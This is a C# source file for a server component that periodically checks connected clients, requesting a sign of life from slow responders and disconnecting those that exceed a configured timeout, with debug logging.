using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Threading;
using NLog;
using Orcus.Server.Core.Config;

namespace Orcus.Server.Core.ClientManagement
{
    public class ClientOnlineChecker : IDisposable
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private readonly int _interval;
        private readonly ConcurrentDictionary<int, Client> _clients;
        private readonly Timer _timer;
        private bool _isStarted;
        private readonly int _timeout;
        private readonly int _requestAnswerDelay;

        public ClientOnlineChecker(int interval, ConcurrentDictionary<int, Client> clients)
        {
            _interval = interval;
            _clients = clients;
            _isStarted = true;
            _timeout = int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("SERVER", "CheckForDeadConnectionsTimeout"));
            _requestAnswerDelay =
                int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("SERVER", "CheckForDeadConnectionsRequestAnswer"));
            _timer = new Timer(Callback, null, interval, Timeout.Infinite);
        }

        public void Dispose()
        {
            _timer.Dispose();
        }

        private void Callback(object state)
        {
            var clients = _clients.Select(x => x.Value).ToList();
            Logger.Debug("Online Checker Callback, {0} clients to check", clients.Count);

            new Thread(() =>
            {
                var now = DateTime.UtcNow;

                foreach (var client in clients)
                {
                    if (client.ComputerInformation.ClientVersion <= 4)
                        continue;

                    var lastAnswer = (now - client.LastAnswer).TotalMilliseconds;
                    if (lastAnswer > _timeout)
                    {
                        Logger.Debug(
                            "Last answer ({0:G}) of client (CI-{1}) is greater ({2} ms) than the timeout ({3} ms). Kick client",
                            client.LastAnswer, client.Id, lastAnswer, _timeout);
                        client.Dispose();
                        continue;
                    }

                    if (!client.IsDisposed && lastAnswer > _requestAnswerDelay)
                        try
                        {
                            Logger.Debug(
                                "Last answer ({0:G}) of client (CI-{1}) is greater ({2} ms) than the request-answer-delay ({3} ms). Request sign of life",
                                client.LastAnswer, client.Id, lastAnswer, _requestAnswerDelay);
                            client.RequestSignOfLife();
                        }
                        catch (Exception)
                        {
                            client.Dispose();
                        }
                }

                if (_isStarted)
                    _timer.Change(_interval, Timeout.Infinite);
            }) {Name = "OnlineCheckerThread", IsBackground = true}.Start();
        }

        public void Start()
        {
            Logger.Info("Start client online checker");
            _isStarted = true;
            _timer.Change(_interval, Timeout.Infinite);
        }

        public void Stop()
        {
            Logger.Info("Stop client online checker");
            _isStarted = false;
        }
    }
}